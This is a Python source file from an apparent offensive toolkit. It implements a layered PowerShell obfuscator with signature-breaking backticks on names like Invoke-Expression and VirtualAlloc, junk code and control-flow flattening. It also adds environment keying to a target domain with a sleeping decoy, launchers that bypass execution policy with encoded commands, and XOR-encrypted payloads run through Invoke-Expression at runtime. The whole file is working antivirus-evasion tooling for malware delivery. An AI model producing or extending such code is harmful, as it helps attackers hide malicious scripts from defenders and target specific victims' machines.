"""PowerShell script obfuscator — multiple levels, string splitting, encoding."""
from __future__ import annotations
import base64
import os
import re

from fitnah.delivery.obfuscation.string_ops import (
    encode_command, compress_ps, to_format_string,
    randomize_case, split_dangerous, xor_encode,
)


class PSObfuscator:
    """Apply layered obfuscation transforms to a PowerShell script."""

    def __init__(self, seed: int | None = None):
        import random
        self._rng = random.Random(seed)

    # ── public API ────────────────────────────────────────────────────────

    def obfuscate(self, script: str, level: int = 2, env_key: str | None = None) -> str:
        """
        Apply obfuscation transforms.

        level 1 — variable rename + split dangerous strings + backtick insertion
        level 2 — level 1 + char-code / format-string for string literals + junk code
        level 3 — level 2 + control flow flattening + base64 / -EncodedCommand wrapper
        level 4 — level 3 + XOR encrypt the -EncodedCommand payload, runtime decode
        """
        script = split_dangerous(script)

        if level >= 1:
            script = self._rename_variables(script)
            script = self._insert_backticks(script)

        if level >= 2:
            script = self._obfuscate_string_literals(script)
            script = self._add_junk_code(script)

        if level >= 3:
            script = self._flatten_control_flow(script)
            if env_key:
                script = self._apply_env_keying(script, env_key)
            # encode only — produce a powershell -EncodedCommand launcher string
            script = self._wrap_encoded_command(script)

        if level >= 4:
            # XOR-encrypt the raw script and produce a self-contained PS decoder
            # that calls Invoke-Expression on the decoded script directly
            script = self._wrap_xor_script(script)

        return script

    def randomize_cmdlets(self, script: str) -> str:
        """Randomly case every known PS cmdlet in the script."""
        cmdlets = [
            "Invoke-Expression", "Add-Type", "New-Object",
            "Get-Process", "Get-WmiObject", "Get-CimInstance",
            "Start-Process", "Stop-Process", "Set-ItemProperty",
            "Get-ItemProperty", "Register-ScheduledTask",
            "Out-Null", "Write-Output", "ForEach-Object",
            "Where-Object", "Select-Object", "Sort-Object",
        ]
        for c in cmdlets:
            if c in script:
                script = script.replace(c, randomize_case(c))
        return script

    # ── internal transforms ───────────────────────────────────────────────

    def _add_junk_code(self, script: str) -> str:
        """Inject random comments and non-functional code blocks."""
        junk_comments = [
            "# System check completed successfully",
            "# Initializing environment variables",
            "# Loading legacy compatibility modules",
            "# TODO: optimize memory allocation for high-latency networks",
            "# Verify integrity of the security provider"
        ]
        junk_code = [
            "$null = Get-Date;",
            "$temp_var = 1 + 2;",
            "if ($false) { Write-Output 'Debugging info' };",
            "[System.GC]::Collect();"
        ]
        
        lines = script.splitlines()
        new_lines = []
        for line in lines:
            if self._rng.random() < 0.1:
                new_lines.append(self._rng.choice(junk_comments))
            if self._rng.random() < 0.05:
                new_lines.append(self._rng.choice(junk_code))
            new_lines.append(line)
        return "\n".join(new_lines)

    def _flatten_control_flow(self, script: str) -> str:
        """Wrap script blocks in a switch-based state machine."""
        lines = [l for l in script.splitlines() if l.strip()]
        if len(lines) < 4: return script # too small to flatten
        
        # Split into 3-5 blocks
        num_blocks = self._rng.randint(3, 5)
        chunk_size = len(lines) // num_blocks
        blocks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
        
        state_var = "v" + os.urandom(3).hex()
        cases = []
        for i, block in enumerate(blocks):
            next_state = i + 1 if i < len(blocks) - 1 else -1
            block_code = "\n".join(block)
            cases.append(f"{i} {{ {block_code}; ${state_var} = {next_state} }}")
            
        flattened = f"""
        ${state_var} = 0
        while (${state_var} -ne -1) {{
            switch (${state_var}) {{
                { " ".join(cases) }
            }}
        }}
        """
        return flattened

    def _apply_env_keying(self, script: str, key: str) -> str:
        """Guard execution behind an environment check (e.g., domain name)."""
        return f"""
        if ($env:USERDOMAIN -ieq '{key}' -or $env:COMPUTERNAME -ieq '{key}') {{
            {script}
        }} else {{
            # Decoy action or silent exit
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 300)
        }}
        """

    def _rename_variables(self, script: str) -> str:
        """Replace $var names with random $v<hex> names (avoids renaming $_ $true etc.)."""
        reserved = {"_", "true", "false", "null", "?", "^", "args", "input",
                    "error", "env", "pwd", "home", "pid", "psitem", "psversiontable"}
        seen: dict[str, str] = {}
        def _replace(m: re.Match) -> str:
            name = m.group(1).lower()
            if name in reserved:
                return m.group(0)
            if name not in seen:
                seen[name] = "v" + os.urandom(3).hex()
            return "$" + seen[name]
        return re.sub(r"\$([A-Za-z_][A-Za-z0-9_]*)", _replace, script)

    def _insert_backticks(self, script: str) -> str:
        """Insert backtick continuations inside long cmdlet names to break signatures.

        Only applies inside quoted strings or identifiers — skip comment lines.
        """
        targets = [
            ("powershell", "power`shell"),
            ("Invoke-Expression", "Invoke`-Expression"),
            ("Add-Type", "Add`-Type"),
            ("VirtualAlloc", "Virtual`Alloc"),
        ]
        for plain, obf in targets:
            script = script.replace(plain, obf)
        return script

    def _obfuscate_string_literals(self, script: str) -> str:
        """Replace short string literals (3-20 chars, alpha-only) with format strings."""
        def _replacer(m: re.Match) -> str:
            s = m.group(1)
            if 3 <= len(s) <= 20 and s.isalpha() and s not in ("false", "true", "null"):
                return to_format_string(s, chunk_size=self._rng.randint(2, 4))
            return m.group(0)
        return re.sub(r'"([A-Za-z]{3,20})"', _replacer, script)

    def _wrap_encoded_command(self, script: str) -> str:
        """Encode the entire script as UTF-16-LE base64 and wrap in a launcher."""
        enc = encode_command(script)
        launcher = (
            "powershell -NoProfile -NonInteractive "
            f"-ExecutionPolicy Bypass -EncodedCommand {enc}"
        )
        return launcher

    def _wrap_xor(self, launcher_cmd: str) -> str:
        """XOR-encrypt a launcher command string (ASCII), decode + execute via Start-Process."""
        key = os.urandom(16)
        data = launcher_cmd.encode("utf-8")
        encrypted = xor_encode(data, key)
        enc_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        return (
            f"$k=[Convert]::FromBase64String('{key_b64}');"
            f"$d=[Convert]::FromBase64String('{enc_b64}');"
            "$b=New-Object byte[] $d.Length;"
            "for($i=0;$i-lt $d.Length;$i++){$b[$i]=$d[$i]-bxor $k[$i%$k.Length]};"
            "$s=[Text.Encoding]::UTF8.GetString($b);"
            "& ([scriptblock]::Create($s))"
        )

    def _wrap_xor_script(self, script: str) -> str:
        """XOR-encrypt a raw PS script (UTF-16-LE), decode + Invoke-Expression at runtime.

        Unlike _wrap_xor this operates on a real PS script (not a launcher command),
        so Invoke-Expression works correctly and the script runs in the current PS context.
        """
        key = os.urandom(16)
        data = script.encode("utf-16-le")
        encrypted = xor_encode(data, key)
        enc_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        return (
            f"$_k=[Convert]::FromBase64String('{key_b64}');"
            f"$_d=[Convert]::FromBase64String('{enc_b64}');"
            "$_b=New-Object byte[] $_d.Length;"
            "for($_i=0;$_i-lt $_d.Length;$_i++){$_b[$_i]=$_d[$_i]-bxor $_k[$_i%$_k.Length]};"
            "$_s=[Text.Encoding]::Unicode.GetString($_b);"
            "Invoke-Expression $_s"
        )
